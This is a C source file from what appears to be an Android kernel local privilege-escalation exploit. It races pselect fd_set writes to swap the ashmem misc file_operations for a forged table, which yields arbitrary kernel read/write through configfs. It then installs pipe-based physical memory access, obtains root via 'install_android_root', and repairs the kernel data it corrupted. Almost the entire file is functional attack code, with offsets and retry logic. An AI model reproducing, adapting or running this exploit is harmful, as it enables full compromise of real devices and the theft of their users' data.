#include "common.h"

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif
#endif

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int one_page_span(uintptr_t start, size_t len) {
  if (!len || start > UINTPTR_MAX - (len - 1)) {
    return 0;
  }
  return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
}

static int audit_fake_fops_table(int fd) {
  enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
  _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
  uint64_t table[span / sizeof(uint64_t)];
  if (!one_page_span(fake_fops, sizeof(table))) {
    pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n",
               fake_fops, sizeof(table));
    return 0;
  }
  ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
  if (rd != (ssize_t)sizeof(table)) {
    pr_warning("cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
               rd, fake_fops, sizeof(table), errno);
    return 0;
  }
  struct expected_slot {
    size_t off;
    uint64_t value;
  } expected[] = {
    {FOPS_OWNER_OFF, 0},
    {FOPS_LLSEEK_OFF, data_addr(ASHMEM_MISC_FOPS)},
    {FOPS_READ_OFF, 0},
    {FOPS_WRITE_OFF, 0},
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };
  pr_info("cfi fake fops span=%016zx-%016zx owner=%016llx llseek=%016llx read=%016llx write=%016llx\n",
          fake_fops, fake_fops + sizeof(table) - 1,
          (unsigned long long)table[FOPS_OWNER_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_LLSEEK_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_READ_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_WRITE_OFF / sizeof(uint64_t)]);
  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
    uint64_t got = table[expected[i].off / sizeof(uint64_t)];
    if (got != expected[i].value) {
      pr_warning("cfi fake fops slot mismatch off=0x%zx got=%016llx want=%016llx\n",
                 expected[i].off, (unsigned long long)got,
                 (unsigned long long)expected[i].value);
      return 0;
    }
  }
  return 1;
}

static int fake_fops_owner_is_zero(int fd) {
  uint64_t owner = UINT64_MAX;
  ssize_t rd = configfs_read_once(
      fd, fake_fops + FOPS_OWNER_OFF, &owner, sizeof(owner));
  cfi_owner_ret = rd;
  if (rd != (ssize_t)sizeof(owner) || owner != 0) {
    pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
               rd, (unsigned long long)owner, errno);
    return 0;
  }
  return 1;
}

#if defined(ASHMEM_MUTEX_OFF)
/*
 * The PI chain race writes collateral data into .data objects near
 * the exploit target (ashmem_miscs).  The global ashmem_mutex sits
 * 176 bytes before ashmem_miscs[0] and is the most frequent crash
 * site: any subsequent ashmem_mmap / ashmem_ioctl dereferences the
 * corrupted wait_list and panics.
 *
 * struct mutex layout (48 bytes, from BTF):
 *   +0   owner            (atomic_long_t, 8B)
 *   +8   wait_lock        (spinlock_t,    4B)
 *   +12  osq              (optimistic_spin_queue, 4B)
 *   +16  wait_list.next   (list_head,     8B)
 *   +24  wait_list.prev   (list_head,     8B)
 *   +32  android_oem_data1                16B
 *
 * A clean unlocked mutex has owner=0, wait_lock=0, osq=0,
 * wait_list pointing to itself, and oem_data zeroed.
 */

#define MUTEX_SIZE          48
#define MUTEX_OWNER_OFF     0
#define MUTEX_WAITLOCK_OFF  8
#define MUTEX_OSQ_OFF       12
#define MUTEX_WAITLIST_OFF  16
#define MUTEX_OEM_OFF       32

static int is_kernel_ptr(uint64_t val) {
  return (val & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

static int mutex_looks_corrupt(const uint8_t *buf) {
  uint64_t owner;
  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
  if (owner != 0 && !is_kernel_ptr(owner)) {
    return 1;
  }
  uint64_t wl_next;
  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
  if (wl_next != 0 && !is_kernel_ptr(wl_next)) {
    return 1;
  }
  return 0;
}

static void dump_hex_line(const char *label, const uint8_t *buf, size_t len) {
  char hex[MUTEX_SIZE * 3 + 1];
  size_t pos = 0;
  for (size_t i = 0; i < len && pos + 3 < sizeof(hex); i++) {
    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
  }
  pr_info("%s: %s\n", label, hex);
}

static int repair_ashmem_mutex(int fd) {
  uintptr_t mutex_direct = data_addr(ASHMEM_MUTEX);
  uintptr_t mutex_canon = canon_addr(ASHMEM_MUTEX);

  uint8_t buf[MUTEX_SIZE];
  memset(buf, 0, sizeof(buf));

  if (!pipe_phys_read_data(fd, mutex_direct, buf, MUTEX_SIZE)) {
    pr_warning("ashmem-repair: failed to read mutex at direct=%016zx\n",
               mutex_direct);
    return 0;
  }

  dump_hex_line("ashmem-repair mutex-before", buf, MUTEX_SIZE);

  if (!mutex_looks_corrupt(buf)) {
    pr_info("ashmem-repair: mutex looks clean, skipping repair\n");
    return 1;
  }

  uint64_t owner;
  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
  uint64_t wl_next;
  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
  pr_warning("ashmem-repair: CORRUPT mutex owner=%016llx waitlist.next=%016llx\n",
             (unsigned long long)owner, (unsigned long long)wl_next);

  uint8_t clean[MUTEX_SIZE];
  memset(clean, 0, sizeof(clean));
  uint64_t self = mutex_canon + MUTEX_WAITLIST_OFF;
  memcpy(clean + MUTEX_WAITLIST_OFF, &self, 8);
  memcpy(clean + MUTEX_WAITLIST_OFF + 8, &self, 8);

  if (!pipe_phys_write_data(fd, mutex_direct, clean, MUTEX_SIZE)) {
    pr_warning("ashmem-repair: failed to write clean mutex\n");
    return 0;
  }

  uint8_t verify[MUTEX_SIZE];
  memset(verify, 0, sizeof(verify));
  if (!pipe_phys_read_data(fd, mutex_direct, verify, MUTEX_SIZE)) {
    pr_warning("ashmem-repair: failed to read back mutex\n");
    return 0;
  }

  dump_hex_line("ashmem-repair mutex-after ", verify, MUTEX_SIZE);

  if (memcmp(clean, verify, MUTEX_SIZE) != 0) {
    pr_warning("ashmem-repair: readback mismatch\n");
    return 0;
  }

  pr_success("ashmem-repair: mutex repaired at %016zx\n", mutex_direct);
  return 1;
}

static int repair_ashmem_lru_list(int fd) {
  uintptr_t lru_direct = data_addr(ASHMEM_LRU_LIST);
  uintptr_t lru_canon = canon_addr(ASHMEM_LRU_LIST);

  uint8_t buf[16];
  if (!pipe_phys_read_data(fd, lru_direct, buf, 16)) {
    pr_warning("ashmem-repair: failed to read lru_list\n");
    return 0;
  }

  uint64_t next, prev;
  memcpy(&next, buf, 8);
  memcpy(&prev, buf + 8, 8);

  pr_info("ashmem-repair lru_list next=%016llx prev=%016llx\n",
          (unsigned long long)next, (unsigned long long)prev);

  if (next != 0 && !is_kernel_ptr(next)) {
    pr_warning("ashmem-repair: lru_list corrupted, resetting to empty\n");
    uint64_t self = lru_canon;
    uint8_t clean[16];
    memcpy(clean, &self, 8);
    memcpy(clean + 8, &self, 8);
    if (!pipe_phys_write_data(fd, lru_direct, clean, 16)) {
      pr_warning("ashmem-repair: failed to write lru_list\n");
      return 0;
    }
    pr_success("ashmem-repair: lru_list repaired\n");
  }
  return 1;
}

static int repair_ashmem_region(int fd) {
  pr_info("ashmem-repair: starting post-exploit .data repair\n");
  pr_info("ashmem-repair: mutex_direct=%016zx mutex_canon=%016zx\n",
          data_addr(ASHMEM_MUTEX), canon_addr(ASHMEM_MUTEX));

  int mutex_ok = repair_ashmem_mutex(fd);
  int lru_ok = repair_ashmem_lru_list(fd);

  if (mutex_ok && lru_ok) {
    pr_success("ashmem-repair: all repairs completed\n");
  } else {
    pr_warning("ashmem-repair: some repairs failed mutex=%d lru=%d\n",
               mutex_ok, lru_ok);
  }
  return mutex_ok;
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
    !defined(SLIDE_STACK_WRITER)
void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}
#endif

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t before = 0;
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  if (!one_page_span(slot, sizeof(llseek))) {
    errno = ERANGE;
    return 0;
  }
  ssize_t before_rd = configfs_read_once(
      fd, slot, &before, sizeof(before));
  if (before_rd != (ssize_t)sizeof(before)) {
    return 0;
  }
  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
          (unsigned long long)before, (unsigned long long)llseek, slot);
  if (before == llseek) {
    return 1;
  }
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  /* Use the S928 post-write boundary before the first fake-fops open. */
  pr_info("stage=verifying-kernel-access\n");
#endif
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!audit_fake_fops_table(fd)) {
    cfi_last_step = 12;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  unsigned char payload_before[sizeof(payload)];
  if (!one_page_span(binwrite_target, sizeof(payload)) ||
      configfs_read_once(fd, binwrite_target, payload_before,
                         sizeof(payload_before)) !=
          (ssize_t)sizeof(payload_before)) {
    cfi_last_step = 13;
    cfi_last_errno = errno;
    goto fail;
  }
  for (size_t i = 0; i < sizeof(payload_before); ++i) {
    if (payload_before[i] != 0) {
      pr_warning("cfi scratch not zero target=%016zx off=0x%zx value=0x%02x\n",
                 binwrite_target, i, payload_before[i]);
      cfi_last_step = 13;
      cfi_last_errno = 0;
      goto fail;
    }
  }
  pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n",
          binwrite_target, binwrite_target + sizeof(payload) - 1,
          sizeof(payload));
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
          misc_fops, (unsigned long long)original_fops);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
  if (!fake_fops_owner_is_zero(fd)) {
    cfi_last_step = 7;
    cfi_last_errno = errno;
    goto fail;
  }
  SYSCHK(close(fd));
  cfi_last_step = 0;
  cfi_last_errno = 0;
  atomic_store(&cfi_stage_done, 1);
  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
  return 1;
#endif

  pr_info("cfi starting pipe physrw\n");

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (getenv("P0_ORACLE_DIAG")) {
    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
    fflush(NULL);
    _exit(diagnostic_ok ? 0 : 1);
  }
#endif

#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
#ifndef PIPE_FIRST_LEAK_ATTEMPTS
#define PIPE_FIRST_LEAK_ATTEMPTS 12
#endif
  for (int first_leak_attempt = 0;
       first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
       first_leak_attempt++) {
    if (first_leak_attempt != 0) {
      reset_pipe_attempt();
    }
    pipebuf_page_base = prepare_pipe_buffer_page();
    pr_info("fresh physrw pipe after verified fops page=%016zx "
            "attempt=%d/%d\n",
            pipebuf_page_base, first_leak_attempt + 1,
            PIPE_FIRST_LEAK_ATTEMPTS);
    if (is_direct_ptr(pipebuf_page_base)) {
      break;
    }
  }
  if (!is_direct_ptr(pipebuf_page_base)) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
      pipebuf_page_base = prepare_pipe_buffer_page();
      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
      if (!is_direct_ptr(pipebuf_page_base)) {
        continue;
      }
#endif
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(ASHMEM_MUTEX_OFF)
  repair_ashmem_region(fd);
#endif

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  int owner_ok = fake_fops_owner_is_zero(fd);
  SYSCHK(close(fd));
  if (owner_ok &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    fake_fops_owner_is_zero(fd);
  }
  SYSCHK(close(fd));
  return 0;
}
